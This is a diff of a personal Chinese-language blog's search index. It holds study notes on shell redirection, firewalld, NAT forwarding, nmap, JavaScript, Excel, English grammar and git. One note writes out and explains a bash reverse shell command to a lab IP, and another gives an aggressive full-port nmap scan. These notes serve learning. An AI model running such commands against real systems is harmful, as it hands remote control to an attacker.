@@ -4,9 +4,22 @@
   
     
     <entry>
+      <title>输入输出重定向</title>
+      <link href="/2023/05/17/shu-ru-shu-chu-chong-ding-xiang/"/>
+      <url>/2023/05/17/shu-ru-shu-chu-chong-ding-xiang/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>424</title>
-      <link href="/2023/04/24/0424/"/>
-      <url>/2023/04/24/0424/</url>
+      <link href="/2023/04/24/fan-dan-shell/"/>
+      <url>/2023/04/24/fan-dan-shell/</url>
       
         <content type="html"><![CDATA[<h1 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h1><p>&amp; 和||前后的命令无论真假都全部执行<br>&amp;&amp;和|前命令为真，后命令才执行</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p><code>bash -i &gt;&amp; /dev/tcp/192.168.10.136/5555 0&gt;&amp;1</code>  这段代码是一个bash命令，用于在一个交互式的shell中执行命令。</p><ol><li><p><code>bash -i</code> 启动一个交互式的shell，即可以接受用户输入的shell</p></li><li><p><code>&gt;&amp; /dev/tcp/192.168.10.136/5555</code>：将标准输出和标准错误重定向到一个TCP连接，连接的目标地址是192.168.10.136，端口号是5555。这意味着shell中执行的任何命令的输出都会发送到这个地址。</p></li><li><p><code>0&gt;&amp;1</code> 将标准输入重定向到标准输出，即从TCP连接中读取输入。这意味着shell可以接受从这个地址发送过来的命令。</p></li></ol><p>综上，这段代码的作用是创建一个反向shell，即在目标机器上运行一个shell，然后通过网络连接将其控制权交给攻击者。这是一种常见的渗透测试和黑客攻击的技术，可以让攻击者在目标机器上执行任意命令。</p><p>&amp;&gt;和&gt;&amp;含义相同都是：都是将标准错误输出和标准输出重定向</p><h1 id="文件描述符的复制"><a href="#文件描述符的复制" class="headerlink" title="文件描述符的复制"></a>文件描述符的复制</h1><p>格式： [n]&lt;&amp;[m] &#x2F; [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p><p>说明：</p><p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p><p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读&#x2F;写方式打开对其没有任何影响）</strong></p><p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>]]></content>
       
@@ -18,8 +31,8 @@
     
     <entry>
       <title>329</title>
-      <link href="/2023/03/29/0329/"/>
-      <url>/2023/03/29/0329/</url>
+      <link href="/2023/03/29/nei-wang-fang-wen-wai-wang/"/>
+      <url>/2023/03/29/nei-wang-fang-wen-wai-wang/</url>
       
         <content type="html"><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>普通用户密钥登录放在普通用户的目录里面</p><h1 id="内网主机通过防火墙转发借助可以访问外网的内网主机访问外网"><a href="#内网主机通过防火墙转发借助可以访问外网的内网主机访问外网" class="headerlink" title="内网主机通过防火墙转发借助可以访问外网的内网主机访问外网"></a>内网主机通过防火墙转发借助可以访问外网的内网主机访问外网</h1><p>两台VMware虚拟机，都是centos7.6。</p><p>外网主机ip:192.168.80.10,192.168.10.138</p><p>内网主机ip:192.168.10.140</p><ol><li><h5 id="在带外网的机器上设置iptables规则或者firewall-cmd规则："><a href="#在带外网的机器上设置iptables规则或者firewall-cmd规则：" class="headerlink" title="在带外网的机器上设置iptables规则或者firewall-cmd规则："></a>在带外网的机器上设置iptables规则或者firewall-cmd规则：</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s <span class="token number">192.168</span>.10.140 -j SNAT --to <span class="token number">192.168</span>.80.10  <span class="token comment"># iptables</span>firewall-cmd  --permanent --direct --passthrough ipv4 -t nat -A POSTROUTING -s <span class="token number">192.168</span>.10.140 -j SNAT --to-source <span class="token number">192.168</span>.80.50  <span class="token comment">#firewall-cmd</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><h5 id="在带带外网机器上打开转发"><a href="#在带带外网机器上打开转发" class="headerlink" title="在带带外网机器上打开转发"></a>在带带外网机器上打开转发</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> net.ipv4.ip_forward<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">>></span> /etc/sysctl.confsysctl -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><h5 id="在内网机器上，设置其网关为-192-168-10-138"><a href="#在内网机器上，设置其网关为-192-168-10-138" class="headerlink" title="在内网机器上，设置其网关为 192.168.10.138"></a>在内网机器上，设置其网关为 192.168.10.138</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">route <span class="token function">add</span> default gw <span class="token number">192.168</span>.10.138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
       
@@ -31,8 +44,8 @@
     
     <entry>
       <title>327</title>
-      <link href="/2023/03/27/0327/"/>
-      <url>/2023/03/27/0327/</url>
+      <link href="/2023/03/27/javascript-han-shu-biao-da-shi/"/>
+      <url>/2023/03/27/javascript-han-shu-biao-da-shi/</url>
       
         <content type="html"><![CDATA[<h1 id="window-网络配置"><a href="#window-网络配置" class="headerlink" title="window 网络配置"></a>window 网络配置</h1><ul><li>网关“在链路上”<br>表示直接发送给目标，而不需要经过路由器（指路由表的网关IP和IF参数对应的接口的IP是一样的）</li></ul><h1 id="javascript-函数表达式"><a href="#javascript-函数表达式" class="headerlink" title="javascript 函数表达式"></a>javascript 函数表达式</h1><p>使用函数表达式，并将 <code>welcome</code> 赋值给在 <code>if</code> 外声明的变量，并具有正确的可见性。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token function">prompt</span><span class="token punctuation">(</span><span class="token string">"What is your age?"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">let</span> welcome<span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>age <span class="token operator">&lt;</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token function-variable function">welcome</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>       <span class="token function-variable function">welcome</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Greetings!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 现在可以了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>函数是值。它们可以在代码的任何地方被分配，复制或声明。</li><li>如果函数在主代码流中被声明为单独的语句，则称为“函数声明”。</li><li>如果该函数是作为表达式的一部分创建的，则称其“函数表达式”。</li><li>在执行代码块之前，内部算法会先处理函数声明。所以函数声明在其被声明的代码块内的任何位置都是可见的。</li><li>函数表达式在执行流程到达时创建。</li></ul>]]></content>
       
@@ -44,8 +57,8 @@
     
     <entry>
       <title>321</title>
-      <link href="/2023/03/21/0321/"/>
-      <url>/2023/03/21/0321/</url>
+      <link href="/2023/03/21/firewall-jiao-cheng/"/>
+      <url>/2023/03/21/firewall-jiao-cheng/</url>
       
         <content type="html"><![CDATA[<h1 id="firewall"><a href="#firewall" class="headerlink" title="firewall"></a>firewall</h1><h4 id="查看服务的状态"><a href="#查看服务的状态" class="headerlink" title="查看服务的状态"></a>查看服务的状态</h4><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --state<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="永久配置存储位置"><a href="#永久配置存储位置" class="headerlink" title="永久配置存储位置"></a>永久配置存储位置</h4><pre class="line-numbers language-none"><code class="language-none">firewall的每个区域的永久配置存储在&#x2F;usr&#x2F;lib&#x2F;firewalld&#x2F;zones&#x2F; 目录中<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使新设置持久"><a href="#使新设置持久" class="headerlink" title="使新设置持久"></a>使新设置持久</h4><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="添加新端口"><a href="#添加新端口" class="headerlink" title="添加新端口"></a>添加新端口</h4><p>通过打开端口，系统可从外部访问，这代表了安全风险。通常，让端口保持关闭，且只在某些服务需要时才打开。</p><h5 id="1-列出所有允许的端口："><a href="#1-列出所有允许的端口：" class="headerlink" title="1.列出所有允许的端口："></a>1.列出所有允许的端口：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-在允许的端口中添加一个端口，以便为入站流量打开这个端口："><a href="#2-在允许的端口中添加一个端口，以便为入站流量打开这个端口：" class="headerlink" title="2.在允许的端口中添加一个端口，以便为入站流量打开这个端口："></a>2.在允许的端口中添加一个端口，以便为入站流量打开这个端口：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --add-port&#x3D;port-number&#x2F;port-type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>端口类型为 tcp、udp、sctp 或 dccp。这个类型必须与网络通信的类型匹配。</p><h5 id="3-使新设置具有持久性"><a href="#3-使新设置具有持久性" class="headerlink" title="3.使新设置具有持久性"></a>3.使新设置具有持久性</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>端口类型为 tcp、udp、sctp 或 dccp。这个类型必须与网络通信的类型匹配。</p><h4 id="关闭端口"><a href="#关闭端口" class="headerlink" title="关闭端口"></a>关闭端口</h4><h5 id="1-列出要关闭的端口情况"><a href="#1-列出要关闭的端口情况" class="headerlink" title="1.列出要关闭的端口情况"></a>1.列出要关闭的端口情况</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-从允许的端口中删除端口，以便对传入的流量关闭"><a href="#2-从允许的端口中删除端口，以便对传入的流量关闭" class="headerlink" title="2.从允许的端口中删除端口，以便对传入的流量关闭"></a>2.从允许的端口中删除端口，以便对传入的流量关闭</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --remove-port&#x3D;port-number&#x2F;port-type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-使新设置具有持久性-1"><a href="#3-使新设置具有持久性-1" class="headerlink" title="3.使新设置具有持久性"></a>3.使新设置具有持久性</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列出区域"><a href="#列出区域" class="headerlink" title="列出区域"></a>列出区域</h4><h5 id="1-查看系统中有哪些可用区："><a href="#1-查看系统中有哪些可用区：" class="headerlink" title="1.查看系统中有哪些可用区："></a>1.查看系统中有哪些可用区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>firewall-cmd –get-zones 命令显示系统上所有可用的区，但不显示特定区的详情。</p><h5 id="2-查看所有区的详细信息："><a href="#2-查看所有区的详细信息：" class="headerlink" title="2.查看所有区的详细信息："></a>2.查看所有区的详细信息：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --list-all-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-查看特定区的详细信息："><a href="#3-查看特定区的详细信息：" class="headerlink" title="3.查看特定区的详细信息："></a>3.查看特定区的详细信息：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --zone&#x3D;zone-name --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更改特定区的-firewalld-设置"><a href="#更改特定区的-firewalld-设置" class="headerlink" title="更改特定区的 firewalld 设置"></a>更改特定区的 firewalld 设置</h4><p>要在其他区域中工作，请使用 <code>--zone=*zone-name*</code> 选项。例如，要允许在区 <em>public</em> 中使用 <code>SSH</code> 服务：</p><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --add-service&#x3D;ssh --zone&#x3D;public<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="更改默认区"><a href="#更改默认区" class="headerlink" title="更改默认区"></a>更改默认区</h4><h5 id="1-显示当前的默认区："><a href="#1-显示当前的默认区：" class="headerlink" title="1.显示当前的默认区："></a>1.显示当前的默认区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-default-zone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-设置新的默认区："><a href="#2-设置新的默认区：" class="headerlink" title="2.设置新的默认区："></a>2.设置新的默认区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --set-default-zone zone-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="将区分配给特定的接口"><a href="#将区分配给特定的接口" class="headerlink" title="将区分配给特定的接口"></a>将区分配给特定的接口</h4><h5 id="1-列出活跃区以及分配给它们的接口"><a href="#1-列出活跃区以及分配给它们的接口" class="headerlink" title="1.列出活跃区以及分配给它们的接口"></a>1.列出活跃区以及分配给它们的接口</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-active-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-为不同的区分配接口"><a href="#2-为不同的区分配接口" class="headerlink" title="2.为不同的区分配接口"></a>2.为不同的区分配接口</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --zone&#x3D;zone_name --change-interface&#x3D;interface_name --permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="在-ifcfg-文件中手动将区分配给网络连接"><a href="#在-ifcfg-文件中手动将区分配给网络连接" class="headerlink" title="在 ifcfg 文件中手动将区分配给网络连接"></a>在 ifcfg 文件中手动将区分配给网络连接</h4><p>当连接由 <strong>NetworkManager</strong> 管理时，必须了解它使用的区。为每个网络连接指定区域，根据计算机有可移植设备的位置提供各种防火墙设置的灵活性。因此，可以为不同的位置（如公司或家）指定区域和设置。要为连接设置一个区，请编辑 <code>/etc/sysconfig/network-scripts/ifcfg-*connection_name*</code> 文件，并添加将区分配给这个连接的行：</p><pre class="line-numbers language-none"><code class="language-none">ZONE&#x3D;zone_name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="创建一个新区"><a href="#创建一个新区" class="headerlink" title="创建一个新区"></a>创建一个新区</h4><h5 id="1-创建一个新区"><a href="#1-创建一个新区" class="headerlink" title="1.创建一个新区"></a>1.创建一个新区</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --permanent --new-zone&#x3D;zone-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-检查是否在您的永久设置中添加了新的区："><a href="#2-检查是否在您的永久设置中添加了新的区：" class="headerlink" title="2.检查是否在您的永久设置中添加了新的区："></a>2.检查是否在您的永久设置中添加了新的区：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --get-zones<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-使新设置具有持久性-2"><a href="#3-使新设置具有持久性-2" class="headerlink" title="3.使新设置具有持久性"></a>3.使新设置具有持久性</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --runtime-to-permanent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用区目标设定传入流量的默认行为"><a href="#使用区目标设定传入流量的默认行为" class="headerlink" title="使用区目标设定传入流量的默认行为"></a>使用区目标设定传入流量的默认行为</h4><p>对于每个区，您可以设置一种处理尚未进一步指定的传入流量的默认行为。此行为是通过设置区的目标来定义的。有四个选项：</p><ul><li><code>ACCEPT</code> ：接受所有传入的数据包，除了特定规则禁止的。</li><li><code>REJECT</code> ：拒绝所有传入的数据包，除了特定规则允许的。当 <code>firewalld</code> 拒绝数据包时，会告知源机器有关拒绝的信息。</li><li><code>DROP</code> ：丢弃所有传入的数据包，除了特定规则允许的。当 <code>firewalld</code> 丢弃数据包时，不会告知源机器有关丢弃数据包的信息。</li><li><code>default</code> ：与 <code>REJECT</code> 的行为类似，但在某些情况下具有特殊含义。详情请查看 <code>firewall-cmd(1)</code> 手册页中的 <code>适应和查询区和策略的选项</code> 部分。</li></ul><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>为区设置目标：</p><ol><li><h5 id="列出特定区的信息以查看默认目标："><a href="#列出特定区的信息以查看默认目标：" class="headerlink" title="列出特定区的信息以查看默认目标："></a>列出特定区的信息以查看默认目标：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --zone&#x3D;zone-name --list-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><h5 id="在区中设置一个新目标："><a href="#在区中设置一个新目标：" class="headerlink" title="在区中设置一个新目标："></a>在区中设置一个新目标：</h5><pre class="line-numbers language-none"><code class="language-none">firewall-cmd --permanent --zone&#x3D;zone-name --set-target&#x3D;&lt;default|ACCEPT|REJECT|DROP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
       
@@ -57,8 +70,8 @@
     
     <entry>
       <title>313</title>
-      <link href="/2023/03/13/0313/"/>
-      <url>/2023/03/13/0313/</url>
+      <link href="/2023/03/13/nmap-sao-miao-you-hua/"/>
+      <url>/2023/03/13/nmap-sao-miao-you-hua/</url>
       
         <content type="html"><![CDATA[<h2 id="nmap-快速端口扫描"><a href="#nmap-快速端口扫描" class="headerlink" title="nmap 快速端口扫描"></a>nmap 快速端口扫描</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sS -Pn -n --open --min-hostgroup <span class="token number">4</span> --min-parallelism <span class="token number">1024</span> --host-timeout <span class="token number">30</span> -T4 -v -p1-65535 -oG result.txt -iL ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；<br>-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；<br>-n： 功能未知；<br>–open： 只输出检测状态为open的端口，即开放的端口；<br>–min-hostgroup 4：调整并行扫描组的大小；<br>–min-parallelism 1024：调整探测报文的并行度；<br>–host-timeout 30：检测超时的跳过<br>-T4：总共有T0-T5，貌似T4比较折中<br>-v：打印详细扫描过程<br>-oG：输出为比较人性化的格式，一条记录一行，后期好处理<br>-iL：载入ip段文件，批量扫，不用一条条执行了。<br>-p 端口</p>]]></content>
       
@@ -70,8 +83,8 @@
     
     <entry>
       <title>310</title>
-      <link href="/2023/03/10/0310/"/>
-      <url>/2023/03/10/0310/</url>
+      <link href="/2023/03/10/0310-sui-shou-ji-lu/"/>
+      <url>/2023/03/10/0310-sui-shou-ji-lu/</url>
       
         <content type="html"><![CDATA[<blockquote><p>secpol.msc  “本地安全策略编辑器”</p></blockquote><blockquote><p>lsass.exe “Local Security Authority Service本地安全权限服务”</p></blockquote>]]></content>
       
@@ -83,8 +96,8 @@
     
     <entry>
       <title>20230307</title>
-      <link href="/2023/03/07/20230307/"/>
-      <url>/2023/03/07/20230307/</url>
+      <link href="/2023/03/07/sui-shou-ji-lu/"/>
+      <url>/2023/03/07/sui-shou-ji-lu/</url>
       
         <content type="html"><![CDATA[<blockquote><p>方括号中的字符串要放在引号中，单引号或双引号都可以。没有引号就是在访问变量 </p></blockquote>]]></content>
       
@@ -102,8 +115,8 @@
     
     <entry>
       <title>20230303</title>
-      <link href="/2023/03/03/20230303/"/>
-      <url>/2023/03/03/20230303/</url>
+      <link href="/2023/03/03/excel-an-ip-pai-xu/"/>
+      <url>/2023/03/03/excel-an-ip-pai-xu/</url>
       
         <content type="html"><![CDATA[<h1 id="excel-按ip排序"><a href="#excel-按ip排序" class="headerlink" title="excel 按ip排序"></a>excel 按ip排序</h1><h2 id="excel方式"><a href="#excel方式" class="headerlink" title="excel方式"></a>excel方式</h2><pre class="line-numbers language-none"><code class="language-none">&#x3D;SUMPRODUCT(MID(SUBSTITUTE(B2,&quot;.&quot;,REPT(&quot; &quot;,20)),&#123;1,21,41,61&#125;,20)*10^&#123;9,6,3,0&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>选中一个空的单元格</li><li>粘贴函数，函数中的A1代表IP地址的列，根据实际表格修改。</li></ol><h2 id="sort命令方式"><a href="#sort命令方式" class="headerlink" title="sort命令方式"></a>sort命令方式</h2><p><code>sort  -t &quot;.&quot; -k1n,1 -k2n,2 -k3n,3 -k4n,4 ip.txt</code></p>]]></content>
       
@@ -128,8 +141,8 @@
     
     <entry>
       <title>913</title>
-      <link href="/2022/09/13/0913/"/>
-      <url>/2022/09/13/0913/</url>
+      <link href="/2022/09/13/bin-yu/"/>
+      <url>/2022/09/13/bin-yu/</url>
       
         <content type="html"><![CDATA[<h3 id="宾语从句一共有-5-中形式"><a href="#宾语从句一共有-5-中形式" class="headerlink" title="宾语从句一共有 5 中形式"></a>宾语从句一共有 5 中形式</h3><ol><li>介宾<br>介宾一般是出现在不及物动词中，当不及物动词后跟了宾语，又将宾语扩展成从句时，那么这个从句就叫做介词宾语从句。S + Vi +介词 + O<br>例：I think of <strong>what I can do</strong>.</li></ol><p>动宾<br>动宾又分为两种情况，单及物动词下的动宾以及双及物动词下的动宾。</p><p>单及物动词之动宾<br>单及物动词又分为是否存在宾补的情况<br>2. 主谓宾 形式的动宾<br>S + Vt + O -&gt;<strong>S + Vt + 宾语从句</strong><br>例如：I think (that) you are the best.<br>3. 主谓宾补形式的动宾<br>S + Vt + O + Oc -&gt;<strong>S + Vt + 宾语从句 +Oc</strong><br>例如：I think that we learn Engilsh well import. import 是宾语补语</p><p>双及物动词后面一般都跟两个宾语，直接宾语和间接宾语，而间接宾语和直接宾语都可以转换成宾语从句。<br>S + Vt + IO + DO -&gt; S+Vt+间接宾语+直接宾语：<br>4. S + Vt + IO + DO -&gt; S+Vt+间接宾语从句+DO<br>5. S + Vt + IO + DO -&gt; S+Vt+IO +直接宾语</p><p>例如：<br>原句：I will give you a gift.<br>间接宾语从句：I will give whoever comes first a gift.<br>直接宾语从句：I will give you whatever you want.<br>双宾语从句：I will give whoever comes first whatever he or she wants.</p>]]></content>
       
@@ -186,8 +199,8 @@
     
     <entry>
       <title>git1</title>
-      <link href="/2022/03/23/git1/"/>
-      <url>/2022/03/23/git1/</url>
+      <link href="/2022/03/23/git-pei-zhi/"/>
+      <url>/2022/03/23/git-pei-zhi/</url>
       
         <content type="html"><![CDATA[<h1 id="git显示中文乱码"><a href="#git显示中文乱码" class="headerlink" title="git显示中文乱码"></a>git显示中文乱码</h1><p>git status 查看改动发现中文乱码</p><pre class="line-numbers language-none"><code class="language-none">git config --global core.quotepath false加上后在git配置文件.gitconfig会出现[core]        quotepath &#x3D; false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
       
